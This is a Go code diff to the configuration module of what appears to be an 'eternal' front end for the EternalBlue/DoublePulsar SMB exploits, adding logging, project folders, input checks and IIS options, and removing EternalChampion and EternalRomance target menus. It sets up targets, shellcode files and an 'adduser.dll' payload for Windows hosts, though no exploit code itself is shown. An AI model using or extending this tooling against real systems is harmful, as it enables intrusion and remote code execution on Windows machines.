@@ -3,7 +3,12 @@ package metatdatas
 import (
 	"eternal/utils"
 	"fmt"
+	"log"
+	"os"
+	"path/filepath"
 	"reflect"
+	"strconv"
+	"strings"
 )
 
 type Meta struct {
@@ -20,26 +25,44 @@ type Meta struct {
 	OutputInstall   string
 	ExploitMethod   string
 	Function        string
+	LogDir          string
+	ProjectName     string
+	IIS             struct {
+		Port           string
+		EnableSSL      string
+		HostString     string
+		MaxSizeToCheck string
+		Delay          string
+	}
 }
 
 var MetaData = Meta{
 	TargetPort:     "445",
 	Protocol:       "SMB",
-	NetworkTimeout: "20",
+	NetworkTimeout: "60",
 	DLLPath:        "./dlls/adduser.dll",
 	Arch:           "x64",
 	Target:         "SERVER_2008R2_SP1",
 	Function:       "Ping",
 	OutputInstall:  "./target.bin",
 	ExploitMethod:  "Default",
+	LogDir:         "./logs/",
+	ProjectName:    "",
+	IIS: struct {
+		Port           string
+		EnableSSL      string
+		HostString     string
+		MaxSizeToCheck string
+		Delay          string
+	}{Port: "80",
+		EnableSSL:      "false",
+		HostString:     "",
+		MaxSizeToCheck: "70",
+		Delay:          "0"},
 }
-var protocols = []string{"SMB", "NBT", "RDP"}
 var archs = []string{"x86", "x64", "unknown"}
-var ec_targets = []string{"XP_SP0SP1_X86", "XP_SP2SP3_X86", "XP_SP1_X64", "XP_SP2_X64", "SERVER_2003_SP0", "SERVER_2003_SP1", "SERVER_2003_SP2", "VISTA_SP0", "VISTA_SP1", "VISTA_SP2", "SERVER_2008_SP0", "SERVER_2008_SP1", "SERVER_2008_SP2", "WIN7_SP0", "WIN7_SP1", "SERVER_2008R2_SP0", "SERVER_2008R2_SP1", "WIN8_SP0"}
 var eb_targets = []string{"XP", "WIN72K8R2"}
-var er_targets = []string{"XP_SP0SP1_X86", "XP_SP2SP3_X86", "XP_SP1_X64", "XP_SP2_X64", "SERVER_2003_SP0", "SERVER_2003_SP1", "SERVER_2003_SP2", "VISTA_SP0", "VISTA_SP1", "VISTA_SP2", "SERVER_2008_SP0", "SERVER_2008_SP1", "SERVER_2008_SP2", "WIN7_SP0", "WIN7_SP1", "SERVER_2008R2_SP0", "SERVER_2008R2_SP1"}
 var functions = []string{"OutputInstall", "Ping", "RunDLL", "RunShellcode", "Uninstall"}
-var er_exploitMethod = []string{"Default", "Fish-in-a-barrel", "Matched-pairs", "Classic-Romance"}
 
 func SetDefaultMetaData() {
 	for {
@@ -50,20 +73,77 @@ func SetDefaultMetaData() {
 			fmt.Println("Wrong IP Address....")
 		} else {
 			MetaData.TargetIp = TargetIp
+			MetaData.IIS.HostString = TargetIp
+			log.SetPrefix("[*] ")
+			log.Println("TargetIp ==> ", MetaData.TargetIp)
+			log.Println("HostString ==> ", MetaData.TargetIp)
+			MetaData.ProjectName = fmt.Sprintf("z%s", MetaData.TargetIp)
 			break
 		}
 	}
+	LogDir := ""
+	for {
+		fmt.Print("Set Base Log Dir(Default ./logs/):")
+		fmt.Scanf("%s\n", &LogDir)
+		if utils.CheckPathLegal(LogDir) {
+			break
+		}
+	}
+	if LogDir != "" {
+		MetaData.LogDir = LogDir
+	}
+	log.SetPrefix("[*] ")
+	log.Println("LogDir ==> ", MetaData.LogDir)
+	utils.CreateLogDir(MetaData.LogDir)
+	Projects := utils.ListDirectory(MetaData.LogDir)
+	ProjectIndex := 0
+	for {
+
+		for index, Project := range Projects {
+			fmt.Printf("%d.%s\n", index, Project)
+		}
+		fmt.Print("Set Project Name(default 0):")
+		fmt.Scanf("%d\n", &ProjectIndex)
+		if ProjectIndex < 0 || ProjectIndex > len(Projects) {
+			fmt.Println("Wrong Project Index.")
+		} else {
+			break
+		}
+	}
+	ProjectName := ""
+	if ProjectIndex == 0 {
+		fmt.Printf("Set Project Name(default %s):", fmt.Sprintf("z%s", MetaData.TargetIp))
+		fmt.Scanf("%s\n", &ProjectName)
+		if ProjectName != "" {
+			MetaData.ProjectName = ProjectName
+		}
+	} else {
+		MetaData.ProjectName = Projects[ProjectIndex]
+	}
+	log.SetPrefix("[*] ")
+	log.Println("Project ==> ", fmt.Sprintf("%s", MetaData.ProjectName))
+	utils.CreateProject(MetaData.LogDir, MetaData.ProjectName)
+	log.SetPrefix("[*] ")
+	log.Println("Set Target Directory ==> ", fmt.Sprintf("z%s", MetaData.TargetIp))
+	utils.CreateProject(filepath.Join(MetaData.LogDir, MetaData.ProjectName), fmt.Sprintf("z%s", MetaData.TargetIp))
+	utils.CreateLog(MetaData.TargetIp, MetaData.LogDir, MetaData.ProjectName)
 }
 func (M *Meta) SetShellcodeFile() {
 	ShellcodeFile := ""
 	for {
 		fmt.Printf("Set DOUP ShellcodeFile:")
 		fmt.Scanf("%s\n", &ShellcodeFile)
-		if ShellcodeFile == "" {
+		if ShellcodeFile == "" || !utils.CheckPathLegal(ShellcodeFile) {
 			fmt.Println("Wrong Shellcode File Path ")
 			continue
 		} else {
+			_, err := os.Stat(ShellcodeFile)
+			if os.IsNotExist(err) {
+				fmt.Println("Shellcode File Not Exists.")
+				continue
+			}
 			M.ShellcodeFile = ShellcodeFile
+			M.ShellcodeBuffer = utils.BinToHex(ShellcodeFile)
 			break
 		}
 	}
@@ -71,32 +151,24 @@ func (M *Meta) SetShellcodeFile() {
 	fmt.Println("ShellcodeFile ==> " + M.ShellcodeFile)
 
 }
-func (M *Meta) SetExploitMethod() {
-	ExploitMethod := 0
-	fmt.Printf(`0) Default              Use the best exploit method(s) for the target OS
-1) Fish-in-a-barrel     Most reliable exploit method (XP/2k3 only)
-2) Matched-pairs        Next reliable exploit method (XP/Win7/2k8R2 only)
-3) Classic-Romance      Original LargePageGroom exploit method (All OS Versions)
-								Select ExploitMethod(Default is %s):`, er_exploitMethod[ExploitMethod])
-	fmt.Scanf("%d\n", ExploitMethod)
-	M.ExploitMethod = er_exploitMethod[ExploitMethod]
-	fmt.Println("ExploitMethod ==> " + M.ExploitMethod)
-}
-func (M *Meta) SetProtocol() {
-	Protocol := -1
-	fmt.Printf("0.SMB\n1.NBT\n2.RDP\nSeletc Protocol:")
-	fmt.Scanf("%d\n", &Protocol)
-	M.Protocol = protocols[Protocol]
-	fmt.Println("Protocol ==> " + M.Protocol)
-}
 func (M *Meta) SetTargetPort() {
 	fmt.Printf("Set TargetPort:")
 	fmt.Scanf("%s\n", &M.TargetPort)
 	fmt.Println("TargetPort ==> " + M.TargetPort)
 }
 func (M *Meta) SetTargetIp() {
-	fmt.Printf("Set TargetIp:")
-	fmt.Scanf("%s\n", &M.TargetIp)
+	TargetIp := ""
+	for {
+		fmt.Printf("Set TargetIp:")
+		fmt.Scanf("%s\n", &TargetIp)
+		if !utils.IPChecker(TargetIp) {
+			fmt.Println("Wrong IP Address.")
+			continue
+		} else {
+			M.TargetIp = TargetIp
+			break
+		}
+	}
 	fmt.Println("TargetIp ==> " + M.TargetIp)
 }
 func (M *Meta) SetNetworkTimeout() {
@@ -118,7 +190,7 @@ func (M *Meta) SetDLLPath() {
 }
 func (M *Meta) SetArch() {
 	arch := -1
-	fmt.Printf("0.x86\n1.x64\n2.unknown\nSeletc Arch(%s):", M.Arch)
+	fmt.Printf("0.x86\n1.x64\nSeletc Arch(%s):", M.Arch)
 	fmt.Scanf("%d\n", &arch)
 	if arch == -1 {
 		fmt.Println("Arch ==> " + M.Arch)
@@ -133,68 +205,26 @@ func (M *Meta) SetTarget(exp string) {
 		fmt.Printf("0) XP\n1) WIN72K8R2\nSelect Target(%s):", eb_targets[target])
 		fmt.Scanf("%d\n", &target)
 		M.Target = eb_targets[target]
-	} else if exp == "ec" {
-		target := 16
-		fmt.Printf(`0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit
-1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit
-2) XP_SP1_X64            Windows XP Sp1, 64-bit
-3) XP_SP2_X64            Windows XP Sp2, 64-bit
-4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit
-5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit
-6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit
-7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit
-8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit
-9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit
-10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit
-11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit
-12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit
-13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit
-14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit
-15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit
-16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit
-17) WIN8_SP0              Windows 8 Sp0, 32-bit/64-bit
-							Seletc Target(%s):`, ec_targets[target])
-		fmt.Scanf("%d\n", &target)
-		M.Target = ec_targets[target]
-	} else if exp == "er" {
-		target := 0
-		fmt.Printf(`0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit
-1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit
-2) XP_SP1_X64            Windows XP Sp1, 64-bit
-3) XP_SP2_X64            Windows XP Sp2, 64-bit
-4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit
-5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit
-6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit
-7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit
-8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit
-9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit
-10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit
-11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit
-12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit
-13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit
-14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit
-15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit
-16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit
-									Seletc Target(%s):`, er_targets[target])
-		fmt.Scanf("%d\n", &target)
-		M.Target = er_targets[target]
 	}
 	fmt.Println("Target ==> " + M.Target)
 }
 func (M *Meta) SetFunction() {
 	function := 1
-	fmt.Printf("0.OutputInstall\n1.Ping\n2.RunDLL\n3.RunShellcode\n4.Uninstall\nSeletc Arch(%s):", functions[function])
+	fmt.Printf("0.OutputInstall\n1.Ping\n2.RunDLL\n3.RunShellcode\n4.Uninstall\nSeletc Function(%s):", functions[function])
 	fmt.Scanf("%d\n", &function)
 	M.Function = functions[function]
 	fmt.Println("Function ==> " + M.Function)
 }
 func (M *Meta) SetOutputInstall() {
 	OutputInstall := ""
-	fmt.Printf("Input OutputInstall Path(%s):", M.OutputInstall)
-	fmt.Scanf("%s\n", &OutputInstall)
-	if OutputInstall == "" {
-		fmt.Println("Wrong OutputInstall Path.")
-		return
+	for {
+		fmt.Printf("Input OutputInstall Path(%s):", M.OutputInstall)
+		fmt.Scanf("%s\n", &OutputInstall)
+		if OutputInstall == "" || !utils.CheckPathLegal(OutputInstall) {
+			fmt.Println("Wrong OutputInstall Path.")
+			continue
+		}
+		break
 	}
 	M.OutputInstall = OutputInstall
 	fmt.Println("OutputInstall ==> " + M.OutputInstall)
@@ -211,4 +241,61 @@ func (M Meta) ShowMetaData() {
 		}
 		fmt.Printf("%v ==> %v\n", key, val)
 	}
+}
+func (M *Meta) SetEnableSSL() {
+	EnableSSL := ""
+	for {
+		fmt.Print("Set EnableSSL(default is false):")
+		fmt.Scanf("%s\n", &EnableSSL)
+		EnableSSL = strings.ToLower(EnableSSL)
+		if EnableSSL == "" {
+			EnableSSL = "false"
+			break
+		} else if EnableSSL == "true" {
+			EnableSSL = "true"
+			break
+		} else {
+			fmt.Println("Wrong Input,Input True or False or Stay Default.")
+			continue
+		}
+	}
+	M.IIS.EnableSSL = EnableSSL
+	fmt.Println("EnableSSL ==> " + M.IIS.EnableSSL)
+}
+func (M *Meta) SetIisPort() {
+	IisPort := ""
+	for {
+		fmt.Print("Set IisPort(default is 80):")
+		fmt.Scanf("%s\n", &IisPort)
+		if IisPort == "" {
+			IisPort = "80"
+			break
+		} else {
+			port, err := strconv.Atoi(IisPort)
+			if err != nil {
+				fmt.Println("Wrong Input,Input Iis Port Number or Stay Default.")
+				continue
+			}
+			if port < 0 || port > 65535 {
+				fmt.Println("Wrong Input,Input Iis Port Number Out Of Range.")
+				continue
+			}
+			break
+		}
+	}
+	M.IIS.Port = IisPort
+	fmt.Println("IisPort ==> " + M.IIS.Port)
+}
+func (M *Meta) SetHostString() {
+	HostString := ""
+	for {
+		fmt.Printf("Set HostString(default is TargetIP %s):", M.TargetIp)
+		fmt.Scanf("%s\n", &HostString)
+		if HostString == "" {
+			HostString = M.TargetIp
+			break
+		}
+	}
+	M.IIS.HostString = HostString
+	fmt.Println("HostString ==> " + M.IIS.HostString)
 }
